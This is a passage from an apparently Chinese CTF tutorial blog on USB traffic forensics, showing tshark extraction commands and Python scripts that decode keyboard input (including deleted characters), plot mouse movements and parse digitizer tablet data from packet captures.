</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>line</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>!=</span><span class=s1>&#39;0&#39;</span> <span class=ow>or</span> <span class=p>(</span><span class=n>line</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>!=</span><span class=s1>&#39;0&#39;</span> <span class=ow>and</span> <span class=n>line</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>!=</span><span class=s1>&#39;2&#39;</span><span class=p>)</span> <span class=ow>or</span> <span class=n>line</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span><span class=o>!=</span><span class=s1>&#39;0&#39;</span> <span class=ow>or</span> <span class=n>line</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span><span class=o>!=</span><span class=s1>&#39;0&#39;</span> <span class=ow>or</span> <span class=n>line</span><span class=p>[</span><span class=mi>6</span><span class=p>]</span><span class=o>!=</span><span class=s1>&#39;0&#39;</span> <span class=ow>or</span> <span class=n>line</span><span class=p>[</span><span class=mi>7</span><span class=p>]</span><span class=o>!=</span><span class=s1>&#39;0&#39;</span> <span class=ow>or</span> <span class=n>line</span><span class=p>[</span><span class=mi>8</span><span class=p>]</span><span class=o>!=</span><span class=s1>&#39;0&#39;</span> <span class=ow>or</span> <span class=n>line</span><span class=p>[</span><span class=mi>9</span><span class=p>]</span><span class=o>!=</span><span class=s1>&#39;0&#39;</span> <span class=ow>or</span> <span class=n>line</span><span class=p>[</span><span class=mi>10</span><span class=p>]</span><span class=o>!=</span><span class=s1>&#39;0&#39;</span> <span class=ow>or</span> <span class=n>line</span><span class=p>[</span><span class=mi>11</span><span class=p>]</span><span class=o>!=</span><span class=s1>&#39;0&#39;</span> <span class=ow>or</span> <span class=n>line</span><span class=p>[</span><span class=mi>12</span><span class=p>]</span><span class=o>!=</span><span class=s1>&#39;0&#39;</span> <span class=ow>or</span> <span class=n>line</span><span class=p>[</span><span class=mi>13</span><span class=p>]</span><span class=o>!=</span><span class=s1>&#39;0&#39;</span> <span class=ow>or</span> <span class=n>line</span><span class=p>[</span><span class=mi>14</span><span class=p>]</span><span class=o>!=</span><span class=s1>&#39;0&#39;</span> <span class=ow>or</span> <span class=n>line</span><span class=p>[</span><span class=mi>15</span><span class=p>]</span><span class=o>!=</span><span class=s1>&#39;0&#39;</span> <span class=ow>or</span> <span class=n>line</span><span class=p>[</span><span class=mi>4</span><span class=p>:</span><span class=mi>6</span><span class=p>]</span><span class=o>==</span><span class=s2>&#34;00&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>             <span class=k>continue</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>line</span><span class=p>[</span><span class=mi>4</span><span class=p>:</span><span class=mi>6</span><span class=p>]</span> <span class=ow>in</span> <span class=n>normalKeys</span><span class=o>.</span><span class=n>keys</span><span class=p>():</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>line</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;2&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>output</span> <span class=o>+=</span> <span class=p>[</span><span class=n>shiftKeys</span><span class=p>[</span><span class=n>line</span><span class=p>[</span><span class=mi>4</span><span class=p>:</span><span class=mi>6</span><span class=p>]]]</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>output</span> <span class=o>+=</span> <span class=p>[</span><span class=n>normalKeys</span><span class=p>[</span><span class=n>line</span><span class=p>[</span><span class=mi>4</span><span class=p>:</span><span class=mi>6</span><span class=p>]]]</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>output</span> <span class=o>+=</span> <span class=p>[</span><span class=s1>&#39;[unknown]&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>pass</span>
</span></span><span class=line><span class=cl><span class=n>keys</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>flag</span><span class=o>=</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>output</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>output</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>==</span> <span class=s2>&#34;&lt;CAP&gt;&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>flag</span> <span class=o>=</span> <span class=mi>1</span> <span class=o>-</span> <span class=n>flag</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>flag</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>output</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>output</span><span class=p>[</span><span class=n>i</span><span class=p>]</span><span class=o>.</span><span class=n>upper</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>pass</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>output</span> <span class=o>=</span> <span class=p>[</span><span class=n>x</span> <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=n>output</span> <span class=k>if</span> <span class=n>x</span> <span class=o>!=</span> <span class=s1>&#39;&lt;CAP&gt;&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>new_output</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>output</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>output</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>==</span> <span class=s2>&#34;&lt;DEL&gt;&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>delete_output</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>output</span><span class=p>[</span><span class=n>i</span><span class=o>-</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=n>new_output</span> <span class=o>=</span> <span class=n>new_output</span><span class=p>[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>new_output</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>output</span><span class=p>[</span><span class=n>i</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;[+] 键盘输入的内容为：</span><span class=si>{</span><span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>output</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;[+] 键盘删除的内容为：</span><span class=si>{</span><span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>delete_output</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;[+] 最后的结果为：</span><span class=si>{</span><span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>new_output</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><p>然后有时候还会出现这样一种考点就是：出题人会把关键信息藏在被<code>&lt;DEL></code>的字符中</p><p>因此我们需要把被删除的字符也还原出来</p><h3 class=heading-element id=鼠标流量分析><span>鼠标流量分析</span>
<a href=#%e9%bc%a0%e6%a0%87%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><blockquote><p>键盘流量的数据常见的长度为4字节、6字节、7字节、8字节</p></blockquote><p>和键盘流量的过程一样，第一步都是先用tshark提取出数据</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>tshark -r example.pcapng -T fields -e usb.capdata <span class=p>|</span> sed <span class=s1>&#39;/^\s*$/d&#39;</span> &gt; data.txt
</span></span><span class=line><span class=cl>tshark -r example.pcapng -T fields -e usbhid.data <span class=p>|</span> sed <span class=s1>&#39;/^\s*$/d&#39;</span> &gt; data.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>tshark -r example.pcapng -Y <span class=s1>&#39;usb.src == &#34;2.3.1&#34;&#39;</span> -T fields -e usbhid.data <span class=p>|</span> sed <span class=s1>&#39;/^\s*$/d&#39;</span> &gt; data.txt
</span></span><span class=line><span class=cl><span class=c1># -r：指定了需要读取的文件</span>
</span></span><span class=line><span class=cl><span class=c1># -Y：使用过滤器</span>
</span></span><span class=line><span class=cl><span class=c1># -T：表示仅仅输出所选字段</span>
</span></span><span class=line><span class=cl><span class=c1># -e：指定提取的字段</span>
</span></span><span class=line><span class=cl><span class=c1># sed &#39;/^\s*$/d&#39;：在sed中使用正则表达式过滤掉所有空行（其中 ^\s*$ 匹配空行，d 表示删除）</span></span></span></code></pre></td></tr></table></div></div><p>然后和网上那些教程不同，我这里就自己改了一下脚本，就不用多此一举给数据添加冒号了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>matplotlib.pyplot</span> <span class=k>as</span> <span class=nn>plt</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>numpy</span> <span class=k>as</span> <span class=nn>np</span>  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_XY</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>out</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>posx</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=n>posy</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;data.txt&#34;</span><span class=p>,</span><span class=s1>&#39;r&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span><span class=o>.</span><span class=n>split</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>line</span> <span class=ow>in</span> <span class=n>data</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>line</span><span class=p>)</span> <span class=o>==</span> <span class=mi>8</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>flag</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>line</span><span class=p>[</span><span class=mi>0</span><span class=p>:</span><span class=mi>2</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span> <span class=c1># 1-左键 2-右键 0-nothing</span>
</span></span><span class=line><span class=cl>                <span class=n>x</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>line</span><span class=p>[</span><span class=mi>2</span><span class=p>:</span><span class=mi>4</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>y</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>line</span><span class=p>[</span><span class=mi>4</span><span class=p>:</span><span class=mi>6</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>elif</span> <span class=nb>len</span><span class=p>(</span><span class=n>line</span><span class=p>)</span> <span class=o>==</span> <span class=mi>12</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>flag</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>line</span><span class=p>[</span><span class=mi>2</span><span class=p>:</span><span class=mi>4</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span> <span class=c1># 1-左键 2-右键 0-nothing</span>
</span></span><span class=line><span class=cl>                <span class=n>x</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>line</span><span class=p>[</span><span class=mi>4</span><span class=p>:</span><span class=mi>6</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>y</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>line</span><span class=p>[</span><span class=mi>6</span><span class=p>:</span><span class=mi>8</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>elif</span> <span class=nb>len</span><span class=p>(</span><span class=n>line</span><span class=p>)</span> <span class=o>==</span> <span class=mi>14</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>flag</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>line</span><span class=p>[</span><span class=mi>2</span><span class=p>:</span><span class=mi>4</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span> <span class=c1># 1-左键 2-右键 0-nothing</span>
</span></span><span class=line><span class=cl>                <span class=n>x</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>line</span><span class=p>[</span><span class=mi>4</span><span class=p>:</span><span class=mi>6</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>y</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>line</span><span class=p>[</span><span class=mi>6</span><span class=p>:</span><span class=mi>8</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>elif</span> <span class=nb>len</span><span class=p>(</span><span class=n>line</span><span class=p>)</span> <span class=o>==</span> <span class=mi>16</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>flag</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>line</span><span class=p>[</span><span class=mi>2</span><span class=p>:</span><span class=mi>4</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span> <span class=c1># 1-左键 2-右键 0-nothing</span>
</span></span><span class=line><span class=cl>                <span class=n>x</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>line</span><span class=p>[</span><span class=mi>4</span><span class=p>:</span><span class=mi>6</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>y</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>line</span><span class=p>[</span><span class=mi>8</span><span class=p>:</span><span class=mi>10</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>            <span class=c1># 鼠标的移动数据通常是以有符号8位整数的形式存储的，范围是 -128 到 127</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>x</span> <span class=o>&gt;</span> <span class=mi>127</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>x</span> <span class=o>-=</span> <span class=mi>256</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>y</span> <span class=o>&gt;</span> <span class=mi>127</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>y</span> <span class=o>-=</span> <span class=mi>256</span>
</span></span><span class=line><span class=cl>            <span class=c1># 累加距离，算出鼠标当前所在的位置</span>
</span></span><span class=line><span class=cl>            <span class=n>posx</span> <span class=o>+=</span> <span class=n>x</span>
</span></span><span class=line><span class=cl>            <span class=n>posy</span> <span class=o>+=</span> <span class=n>y</span>
</span></span><span class=line><span class=cl>            <span class=c1># 查看鼠标左键/右键/nothing的轨迹</span>
</span></span><span class=line><span class=cl>            <span class=c1># if flag == 0:</span>
</span></span><span class=line><span class=cl>            <span class=c1># if flag == 1:</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>flag</span> <span class=o>==</span> <span class=mi>2</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>out</span> <span class=o>+=</span> <span class=nb>str</span><span class=p>(</span><span class=n>posx</span><span class=p>)</span> <span class=o>+</span> <span class=s1>&#39; &#39;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>posy</span><span class=p>)</span> <span class=o>+</span> <span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;xy.txt&#34;</span><span class=p>,</span><span class=s2>&#34;w&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>out</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>plot</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=c1># unpack=True将每列数据分别存储到一个数组中</span>
</span></span><span class=line><span class=cl>    <span class=n>x</span><span class=p>,</span><span class=n>y</span> <span class=o>=</span> <span class=n>np</span><span class=o>.</span><span class=n>loadtxt</span><span class=p>(</span><span class=s2>&#34;xy.txt&#34;</span><span class=p>,</span><span class=n>delimiter</span><span class=o>=</span><span class=s1>&#39; &#39;</span><span class=p>,</span><span class=n>unpack</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>plt</span><span class=o>.</span><span class=n>plot</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=o>-</span><span class=n>y</span><span class=p>,</span> <span class=s1>&#39;.&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>plt</span><span class=o>.</span><span class=n>show</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>get_XY</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>plot</span><span class=p>()</span></span></span></code></pre></td></tr></table></div></div><h3 class=heading-element id=数位板流量分析><span>数位板流量分析</span>
<a href=#%e6%95%b0%e4%bd%8d%e6%9d%bf%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><p><a href=https://goodlunatic.github.io/posts/3f7db4e/#%E9%A2%98%E7%9B%AE%E5%90%8D%E7%A7%B0-hard_digital_plate target=_blank rel="external nofollow noopener noreferrer">例题1-2022浙江省赛决赛-hard_Digital_plate</a></p><p>例题2-RoarCTF MISC Davinci_Cipher</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 先导出数据并去除空行</span>
</span></span><span class=line><span class=cl>tshark -r hard_Digital_plate.pcapng -T fields -e usb.capdata <span class=p>|</span> sed <span class=s1>&#39;/^\s*$/d&#39;</span> &gt; out.txt
</span></span><span class=line><span class=cl><span class=c1># -r 指定了需要读取的文件</span>
</span></span><span class=line><span class=cl><span class=c1># -T 表示仅仅输出所选字段</span>
</span></span><span class=line><span class=cl><span class=c1># -e 指定提取的字段</span>
</span></span><span class=line><span class=cl><span class=c1># 在sed中使用正则表达式过滤掉所有空行（其中 ^\s*$ 匹配空行，`d` 表示删除）</span></span></span></code></pre></td></tr></table></div></div><p>类似于：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>08803708951e000000000000
</span></span><span class=line><span class=cl>08803708951e000000000000
</span></span><span class=line><span class=cl>08803708951e000000000000
</span></span><span class=line><span class=cl>08803708951e000000000000
</span></span><span class=line><span class=cl>08803708951e000000000000
</span></span><span class=line><span class=cl>08813708951e650000000000
</span></span><span class=line><span class=cl>08813808951ec10000000000
</span></span><span class=line><span class=cl>08813908951e2e0100000000
</span></span><span class=line><span class=cl>08813a08951e940100000000
</span></span><span class=line><span class=cl>08813b08951ee20100000000
</span></span><span class=line><span class=cl>08813c08951e1c0200000000
</span></span><span class=line><span class=cl>08813c08951e440200000000
</span></span><span class=line><span class=cl>08813c08951e610200000000</span></span></code></pre></td></tr></table></div></div><p>需要我们根据设备的传输协议来分析出对应的xy坐标以及压感数据</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>matplotlib.pyplot</span> <span class=k>as</span> <span class=nn>plt</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;data.txt&#34;</span><span class=p>,</span><span class=s2>&#34;r&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>lines</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span><span class=o>.</span><span class=n>split</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>draw_pic1</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>x</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=n>y</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>line</span> <span class=ow>in</span> <span class=n>lines</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>line</span><span class=p>[</span><span class=mi>12</span><span class=p>:</span><span class=mi>16</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>x</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>line</span><span class=p>[</span><span class=mi>6</span><span class=p>:</span><span class=mi>8</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span> <span class=o>&lt;&lt;</span> <span class=mi>8</span> <span class=o>|</span> <span class=nb>int</span><span class=p>(</span><span class=n>line</span><span class=p>[</span><span class=mi>4</span><span class=p>:</span><span class=mi>6</span><span class=p>],</span><span class=mi>16</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=n>y</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span> <span class=o>*</span> <span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>line</span><span class=p>[</span><span class=mi>10</span><span class=p>:</span><span class=mi>12</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span> <span class=o>&lt;&lt;</span> <span class=mi>8</span> <span class=o>|</span> <span class=nb>int</span><span class=p>(</span><span class=n>line</span><span class=p>[</span><span class=mi>8</span><span class=p>:</span><span class=mi>10</span><span class=p>],</span><span class=mi>16</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>plt</span><span class=o>.</span><span class=n>plot</span><span class=p>(</span><span class=n>x</span><span class=p>,</span><span class=n>y</span><span class=p>,</span><span class=s1>&#39;.&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>plt</span><span class=o>.</span><span class=n>show</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>draw_pic2</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>x</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=n>y</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=n>press_lst</span> <span class=o>=</span> <span class=p>[]</span>
